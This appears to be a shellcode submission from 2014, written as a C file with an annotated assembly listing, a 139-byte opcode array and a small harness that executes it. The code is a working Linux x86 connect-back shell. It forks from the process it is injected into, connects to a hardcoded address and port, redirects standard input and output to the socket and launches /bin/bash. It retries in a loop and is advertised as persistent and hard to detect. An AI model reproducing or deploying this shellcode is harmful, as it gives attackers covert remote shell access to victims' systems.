/*
#Title: connect back shellcode that splits from the process it was injected into, and then stays persistent and difficult to remove. It is also very close to invisible due to some interesting effects created by forking, and calling the rdtsc instruction
#length: 139 bytes
#Date: 14 September  2014
#Author: Aaron Yool (aka: MadMouse)
#tested On: Linux kali 3.14-kali1-amd64 #1 SMP Debian 3.14.5-1kali1 (2014-06-07) x86_64 GNU/Linux
*/

/*
;
; part of my shellcode for noobs lesson series hosted in #goatzzz on
irc.enigmagroup.org
;
; 32bit call: eax args: ebx, ecx, edx, esi, edi, and ebp
;
; part of my shellcode for noobs lesson series hosted in #goatzzz on
irc.enigmagroup.org
;
; 32bit call: eax args: ebx, ecx, edx, esi, edi, and ebp
[bits 32]
section .text
global _start
_start:
; fork(void);
    xor eax,eax ; cleanup after rdtsc
    xor edx,edx ; ....
    xor ebx,ebx ; cleanup the rest
    xor ecx,ecx ; ....
    mov al,0x02
    int 0x80
    cmp eax,1    ; if this is a child, or we have failed to clone
    jl fork        ; jump to the main code
    jmp exit
fork:
; socket(AF_INET, SOCK_STREAM, 0);
    push eax
    push byte 0x1 ; SOCK_STREAM
    push byte 0x2 ; AF_INET
    mov al, 0x66 ; sys_socketcall
    mov bl,0x1    ; sys_socket
    mov ecx,esp
    int 0x80

; dup2(s,i);
    mov ebx,eax ; s
    xor ecx,ecx
loop:
    mov al,0x3f    ; sys_dup2
    int 0x80
    inc ecx
    cmp ecx,4
    jne loop

; connect(s, (sockaddr *) &addr,0x10);
    push 0x0101017f        ; IP = 127.1.1.1
    push word 0x391b    ; PORT = 6969
    push word 0x2        ; AF_INET
    mov ecx,esp

    push byte 0x10
    push ecx        ;pointer to arguments
    push ebx        ; s -> standard out/in
    mov ecx,esp
    mov al,0x66
    int 0x80
    xor ecx,ecx
    sub eax,ecx
    jnz cleanup ; cleanup and start over

; fork(void);
    mov al,0x02
    int 0x80
    cmp eax,1    ; if this is a child, or we have failed to clone
    jl client    ; jump to the shell
    xor eax,eax
    push eax
    jmp cleanup ; cleanup and start over

client:
; execve(SHELLPATH,{SHELLPATH,0},0);
    mov al,0x0b
    jmp short sh
load_sh:
    pop esi
    push edx ; 0
    push esi
    mov ecx,esp
    mov ebx,esi
    int 0x80

cleanup:
; close(%ebx)
    xor eax,eax
    mov al,0x6
    int 0x80
    pause
    rdtsc
    pause
    jmp _start

exit:
; exit(0);
    xor eax,eax
    mov al,0x1
    xor ebx,ebx
    int 0x80

sh:
    call load_sh
    db "/bin/bash"

*/

const char evil[] =
"\x31\xc0\x31\xd2\x31\xdb\x31\xc9\xb0\x02\xcd\x80\x83\xf8\x01\x7c\x02\xeb\x62\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x04\x75\xf6\x68\x7f\x01\x01\x01\x66\x68\x1b\x39\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xb0\x66\xcd\x80\x31\xc9\x29\xc8\x75\x1b\xb0\x02\xcd\x80\x83\xf8\x01\x7c\x05\x31\xc0\x50\xeb\x0d\xb0\x0b\xeb\x1f\x5e\x52\x56\x89\xe1\x89\xf3\xcd\x80\x31\xc0\xb0\x06\xcd\x80\xf3\x90\x0f\x31\xf3\x90\xeb\x8b\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68";

typedef void (*shellcode)(void);
void main(void)
{
    ((shellcode)evil)();
}